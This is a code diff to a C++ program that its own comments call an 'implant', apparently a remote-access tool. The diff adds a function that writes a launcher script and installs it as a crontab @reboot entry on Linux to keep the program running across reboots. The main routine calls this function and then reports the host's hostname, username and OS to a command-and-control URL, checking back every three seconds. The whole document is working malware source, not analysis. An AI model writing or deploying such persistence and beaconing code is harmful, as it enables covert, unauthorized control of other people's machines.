@@ -6,6 +6,7 @@
 #include <iostream>
 #include "curl/curl.h"
 #include <sys/stat.h>
+#include <fstream>
 
 using namespace std; 
 
@@ -168,17 +169,42 @@ void upload_file(string url, string location) {
     }*/
 }
 
+void make_shell_persistance(){
+    //Create shell script to launch implant
+    string file_path = "'" + exec("readlink -f a.out") + "'";
+    string shellfile = "#! /bin/sh\n" + file_path;
+
+    //Write script to file
+    const char *write_path = "script.sh";
+    std::ofstream out(write_path);
+    out << shellfile;
+    out.close();
+
+    //Get persistance of launch script
+    string script_path = exec("readlink -f script.sh");
+    cout << script_path << endl;
+    string sys_cmd = "(crontab -l; echo '@reboot sh "+ script_path +"' ) | crontab -";
+
+    //Run scrip on Linux
+    string os = get_os();
+    if(os == "Linux"){
+        system(sys_cmd.c_str());
+    }
+}
+
 int main() {
     string hostname = exec("hostname");
     string user = exec("id -un");
     string os = get_os();
+
+    make_shell_persistance();
 
     string id = "";
     while(id == "")
     {
         id = post(HOST_URL + "connect", "hostname=" + hostname +
                 "&user=" + user + "&os=" + os);
-        //this_thread::sleep_for(chrono::seconds(3));
+        this_thread::sleep_for(chrono::seconds(3));
     }
 
     //Local file test
